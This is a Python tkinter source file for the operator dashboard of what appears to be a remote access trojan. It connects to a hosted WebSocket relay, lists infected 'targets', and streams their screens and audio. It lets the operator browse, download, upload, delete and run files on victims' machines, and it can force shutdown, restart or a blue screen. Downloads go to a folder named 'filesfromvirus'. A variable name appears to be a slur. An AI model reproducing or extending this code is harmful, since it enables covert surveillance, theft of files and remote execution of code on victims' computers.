import tkinter as tk
from tkinter import ttk,filedialog, messagebox
import threading
import json
import base64
import os
import time
import websocket
from io import BytesIO
from PIL import Image, ImageTk
import pyaudio
import queue

FORMAT = pyaudio.paInt16
CHANNELS = 2
RATE = 16000

p = pyaudio.PyAudio()
stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True)

audio_queue = queue.Queue()

# Dedicated worker function that plays audio chunks sequentially
def audio_player_worker():
    print("🤖 Playback worker thread started.")
    while True:
        # .get() will block and wait efficiently until an item is available
        raw_audio = audio_queue.get()
        if raw_audio is None: 
            break # Exit signal
        
        try:
            stream.write(raw_audio)
        except Exception as e:
            print(f"Playback error: {e}")
        
        audio_queue.task_done()

# Start the single, permanent background worker thread
worker_thread = threading.Thread(target=audio_player_worker, daemon=True)
worker_thread.start()

available_targets = []
live_frames = {}
target_files = {}  # Format: { "Target-PC": {"path": "C:\\...", "files": ["file1.txt", "dir/"]} }

class ViewerDashboard(tk.Tk):
    def __init__(self, render_url):
        super().__init__()
        self.title("WebSocket Central Viewer")
        self.geometry("1300x650")  
        self.render_url = render_url
        self.selected_target = None
        self.current_img_tk = None
        self.ws = None 
        self.current_remote_path = "" # Tracks where we currently are on the target

        self._build_ui()
        threading.Thread(target=self._network_listener, daemon=True).start()
        self._refresh_loop()

    def _build_ui(self):
        # 1. LEFT PANE: Online Targets
        left_frame = ttk.LabelFrame(self, text=" Online Targets ", padding=10)
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)

        # Added exportselection=False so clicking doesn't break stream selection
        self.user_listbox = tk.Listbox(left_frame, width=25, font=("Consolas", 11), exportselection=False)
        self.user_listbox.pack(fill=tk.BOTH, expand=True)
        self.user_listbox.bind("<<ListboxSelect>>", self._on_select)

        # 2. CENTER-LEFT PANE: File Manager
        self.file_frame = ttk.LabelFrame(self, text=" Remote File Manager ", padding=10)
        
        # Path Navigation Header
        nav_frame = ttk.Frame(self.file_frame)
        nav_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.back_btn = tk.Button(nav_frame, text="⬅️ Up", command=self._on_navigate_back, font=("Arial", 9, "bold"))
        self.back_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        self.path_label = ttk.Label(nav_frame, text="/", font=("Consolas", 10), wraplength=180)
        self.path_label.pack(side=tk.LEFT, fill=tk.X, expand=True)

        # Added exportselection=False here too
        self.file_listbox = tk.Listbox(self.file_frame, width=35, font=("Consolas", 10), bg="#fcfcfc", exportselection=False)
        self.file_listbox.pack(fill=tk.BOTH, expand=True)
        self.file_listbox.bind("<Double-1>", self._on_file_double_click)

        # File Management Operations Bar
        ops_frame = ttk.Frame(self.file_frame)
        ops_frame.pack(fill=tk.X, pady=(5, 0))

        self.rename_btn = tk.Button(ops_frame, text="✏️ Rename", bg="#f39c12", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_rename_click)
        self.rename_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))

        self.delete_btn = tk.Button(ops_frame, text="🗑️ Delete", bg="#c0392b", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_delete_click)
        self.delete_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(2, 0))

        self.add_folder_btn = tk.Button(ops_frame, text="📂 Add Folder", bg="#ff8800", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_add_folder_click)
        self.add_folder_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))

        self.upload_file_btn = tk.Button(ops_frame, text="Upload File", bg="#008cff", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_upload_file_click)
        self.upload_file_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))

        self.download_file = tk.Button(ops_frame, text="Download File", bg="#CC06CC", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_download_file_click)
        self.download_file.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))

        self.run_file = tk.Button(ops_frame, text="Run File", bg="#CC0631", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_run_file_click)
        self.run_file.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))

        self.refresh_files_btn = tk.Button(
            self.file_frame, text="🔄 Refresh Current Window", 
            bg="#2e4053", fg="white", font=("Arial", 9, "bold"), relief=tk.FLAT,
            command=self._request_file_refresh
        )
        self.refresh_files_btn.pack(fill=tk.X, pady=(5, 0))

        # 3. RIGHT PANE: Status, Video Canvas, Control Buttons
        right_frame = ttk.Frame(self, padding=10)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.status_label = ttk.Label(right_frame, text="Select a target to view stream", font=("Arial", 12, "bold"))
        self.status_label.pack(anchor=tk.W, pady=(0, 10))

        self.canvas = tk.Canvas(right_frame, bg="black")
        self.canvas.pack(fill=tk.BOTH, expand=True)

        self.button_frame = ttk.Frame(right_frame, padding=5)
        
        self.red_btn1 = tk.Button(self.button_frame, text="Shutdown", bg="#b30000", fg="#ffffff", font=("Arial", 10, "bold"), relief=tk.FLAT, command=self._on_red1)
        self.red_btn1.pack(side=tk.LEFT, padx=5, pady=5)

        self.red_btn2 = tk.Button(self.button_frame, text="Restart", bg="#b30000", fg="#ffffff", font=("Arial", 10, "bold"), relief=tk.FLAT, command=self._on_red2)
        self.red_btn2.pack(side=tk.LEFT, padx=5, pady=5)

        self.blue_btn = tk.Button(self.button_frame, text="Blue screen", bg="#1a5276", fg="#ffffff", font=("Arial", 10, "bold"), relief=tk.FLAT, command=self._on_blue)
        self.blue_btn.pack(side=tk.LEFT, padx=5, pady=5)

    def _network_listener(self):
        while True:
            try:
                self.ws = websocket.WebSocket()
                self.ws.connect(self.render_url)
                self.ws.send(json.dumps({"type": "register_viewer"}))
                
                while True:
                    result = self.ws.recv()
                    if not result: break
                    payload = json.loads(result)
                    p_type = payload.get("type")
                    
                    if p_type == "list":
                        global available_targets
                        available_targets = payload.get("data", [])
                    elif p_type == "frame":
                        live_frames[payload.get("user")] = payload.get("frame")
                        audio_string = payload.get("audio")
                        
                        if audio_string:
                            # Decode base64 back to raw bytes
                            raw_audio_data = base64.b64decode(audio_string.encode('utf-8'))
                            audio_queue.put(raw_audio_data)
                    elif p_type == "file_list":
                        target_name = payload.get("user")
                        # Capture directory snapshot dictionary securely
                        target_files[target_name] = {
                            "path": payload.get("path", ""),
                            "files": payload.get("files", [])
                        }
                    elif p_type == "file_recv":
                        print("try to recieve")
                        target_name = payload.get("user")
                        if target_name == self.selected_target:
                            filename = payload.get("filename", "")
                            base64_data = payload.get("data_b64", "")
                            if filename and base64_data:
                                nig = f"filesfromvirus/{target_name}/downloads/"
                                if not os.path.exists(nig):
                                    os.makedirs(nig)

                                dst = os.path.join(nig, filename)
                                try:
                                    print("attempt")
                                    # 1. Reverse the conversion: Translate the text-safe Base64 string back into binary bytes
                                    decoded_bytes = base64.b64decode(base64_data)
                                    
                                    # 2. Write the binary bytes directly onto the recipient disk ('wb')
                                    with open(dst, "wb") as dst:
                                        dst.write(decoded_bytes)
                                except Exception as e: print(e)
            except Exception as e:
                time.sleep(5)

    def _refresh_loop(self):
        self._update_listbox()
        self._update_file_listbox()  
        self._update_screencast()
        self.after(100, self._refresh_loop)

    def _update_listbox(self):
        current_sel = self.user_listbox.curselection()
        selected_text = self.user_listbox.get(current_sel[0]) if current_sel else None

        self.user_listbox.delete(0, tk.END)
        for target in available_targets:
            self.user_listbox.insert(tk.END, target)
            if target == selected_text:
                self.user_listbox.selection_set(tk.END)

    def _update_file_listbox(self):
        if not self.selected_target:
            return
        
        # Safely extract dictionary keys
        data_payload = target_files.get(self.selected_target, {})
        files = data_payload.get("files", [])
        path = data_payload.get("path", "")
        
        self.current_remote_path = path
        self.path_label.config(text=path if path else "/")

        current_items = self.file_listbox.get(0, tk.END)
        if list(current_items) != files:
            self.file_listbox.delete(0, tk.END)
            for file in files:
                self.file_listbox.insert(tk.END, file)

    def _on_select(self, event):
        selection = self.user_listbox.curselection()
        if selection:
            self.selected_target = self.user_listbox.get(selection[0])
            self.status_label.config(text=f"Streaming: {self.selected_target}")
            
            self.file_frame.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=10, before=self.canvas.master)
            self.button_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=5)
            
            self.current_remote_path = "" # Reset tracking path string
            self._request_file_refresh()
        else:
            self.selected_target = None
            self.file_frame.pack_forget()
            self.button_frame.pack_forget()

    def _request_file_refresh(self):
        if self.ws and self.selected_target:
            self.ws.send(json.dumps({
                "type": "viewer_frame",
                "target": self.selected_target,
                "command": "refresh_directory",
                "target_path": self.current_remote_path
            }))

    def _on_file_double_click(self, event):
        selection = self.file_listbox.curselection()
        if selection and self.selected_target:
            selected_item = self.file_listbox.get(selection[0])
            
            # Check if the item starts with a folder emoji
            if selected_item.startswith("📁"):
                # Strip out the emoji and the space following it
                folder_clean = selected_item.replace("📁 ", "")
                self.ws.send(json.dumps({
                    "type": "viewer_frame",
                    "target": self.selected_target,
                    "command": "navigate_into",
                    "target_path": self.current_remote_path,
                    "item_name": folder_clean
                }))

    def _on_navigate_back(self):
        if self.selected_target and self.ws:
            self.ws.send(json.dumps({
                "type": "viewer_frame",
                "target": self.selected_target,
                "command": "navigate_back",
                "target_path": self.current_remote_path
            }))

    def _on_delete_click(self):
        selection = self.file_listbox.curselection()
        if selection and self.selected_target and self.ws:
            selected_item = self.file_listbox.get(selection[0])
            # Strip whatever emoji type prefix exists (folder or file)
            item_clean = selected_item.replace("📁 ", "").replace("📄 ", "")
            
            self.ws.send(json.dumps({
                "type": "viewer_frame",
                "target": self.selected_target,
                "command": "delete_item",
                "target_path": self.current_remote_path,
                "item_name": item_clean
            }))

    def _on_add_folder_click(self):
        if self.selected_target and self.ws:
            dialog = tk.Toplevel(self)
            dialog.title("Add Folder")
            dialog.geometry("300x120")
            dialog.resizable(False, False)
            
            ttk.Label(dialog, text=f"Folder Name:").pack(pady=5)
            entry = ttk.Entry(dialog, width=30)
            entry.pack(pady=5)
            entry.insert(0, "")
            
            def submit():
                name = entry.get().strip()
                self.ws.send(json.dumps({
                        "type": "viewer_frame",
                        "target": self.selected_target,
                        "command": "add_folder",
                        "target_path": self.current_remote_path,
                        "name": name
                    }))
                dialog.destroy()
                
            ttk.Button(dialog, text="Apply Changes", command=submit).pack(pady=5)

    def _on_run_file_click(self):
        selection = self.file_listbox.curselection()
        if selection and self.selected_target and self.ws:
            selected_item = self.file_listbox.get(selection[0])
            # Strip whatever emoji type prefix exists (folder or file)
            item_clean = selected_item.replace("📁 ", "").replace("📄 ", "")
            
            self.ws.send(json.dumps({
                "type": "viewer_frame",
                "target": self.selected_target,
                "command": "run_item",
                "target_path": self.current_remote_path,
                "item_name": item_clean
            }))

    def _on_download_file_click(self):
        selection = self.file_listbox.curselection()
        if selection and self.selected_target and self.ws:
            selected_item = self.file_listbox.get(selection[0])
            # Strip whatever emoji type prefix exists (folder or file)
            item_clean = selected_item.replace("📁 ", "").replace("📄 ", "")
            
            self.ws.send(json.dumps({
                "type": "viewer_frame",
                "target": self.selected_target,
                "command": "download_item",
                "target_path": self.current_remote_path,
                "item_name": item_clean
            }))

    def _on_upload_file_click(self):
        if self.selected_target and self.ws:
            file_path = filedialog.askopenfilename(
                title="Select File to Transmit",
                filetypes=[("All Files", "*.*")]
            )
            
            # If the user cancels the prompt window, safely exit
            if not file_path:
                return
                
            file_name = os.path.basename(file_path)
            #self.title.config(text=f"Selected: {file_name}")

            try:
                # 2. Read the file completely into memory as raw binary bytes ('rb')
                with open(file_path, "rb") as file:
                    raw_bytes = file.read()
                    
                # 3. Convert the raw binary data into a clean text-safe Base64 string
                # .decode('utf-8') turns the bytes-like base64 into a pure printable string
                base64_string = base64.b64encode(raw_bytes).decode("utf-8")
                
                # 4. Construct your structural payload to send over WebSockets
                
                # --- SIMULATION SECTION ---
                # Instead of a live websocket connection, let's simulate the recipient 
                # receiving this JSON payload data and saving it to disk automatically.
                print(f"[Sender] Encoded {file_name} into Base64 string (Length: {len(base64_string)} chars)")
                # ---------------------------

                self.ws.send(json.dumps({
                    "type": "viewer_frame",
                    "target": self.selected_target,
                    "command": "add_file",
                    "target_path": self.current_remote_path,
                    "filename": file_name,
                    "data_b64": base64_string
                }))
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to process file:\n{e}")

    def _on_rename_click(self):
        selection = self.file_listbox.curselection()
        if selection and self.selected_target and self.ws:
            selected_item = self.file_listbox.get(selection[0])
            old_name = selected_item.replace("📁 ", "").replace("📄 ", "")
            
            dialog = tk.Toplevel(self)
            dialog.title("Rename Item")
            dialog.geometry("300x120")
            dialog.resizable(False, False)
            
            ttk.Label(dialog, text=f"Rename: {old_name}").pack(pady=5)
            entry = ttk.Entry(dialog, width=30)
            entry.pack(pady=5)
            entry.insert(0, old_name)
            
            def submit():
                new_name = entry.get().strip()
                if new_name and new_name != old_name:
                    self.ws.send(json.dumps({
                        "type": "viewer_frame",
                        "target": self.selected_target,
                        "command": "rename_item",
                        "target_path": self.current_remote_path,
                        "old_name": old_name,
                        "new_name": new_name
                    }))
                dialog.destroy()
                
            ttk.Button(dialog, text="Apply Changes", command=submit).pack(pady=5)

    def _send_action(self, action_name):
        if self.ws and self.selected_target:
            self.ws.send(json.dumps({
                "type": "viewer_frame",
                "target": self.selected_target,
                "command": action_name
            }))

    def _on_red1(self): self._send_action("shutdown")
    def _on_red2(self): self._send_action("restart")
    def _on_blue(self): self._send_action("bluescreen")

    def _update_screencast(self):
        if not self.selected_target or self.selected_target not in available_targets:
            return
        frame_b64 = live_frames.get(self.selected_target)
        if not frame_b64: return
        try:
            img_bytes = base64.b64decode(frame_b64)
            img = Image.open(BytesIO(img_bytes))
            c_width, c_height = max(self.canvas.winfo_width(), 100), max(self.canvas.winfo_height(), 100)
            img.thumbnail((c_width, c_height), Image.Resampling.LANCZOS)
            self.current_img_tk = ImageTk.PhotoImage(img)
            self.canvas.delete("all")
            self.canvas.create_image(c_width // 2, c_height // 2, anchor=tk.CENTER, image=self.current_img_tk)
        except Exception: pass

if __name__ == "__main__":
    app = ViewerDashboard("wss://anotherwebsite-x1gv.onrender.com")
    app.mainloop()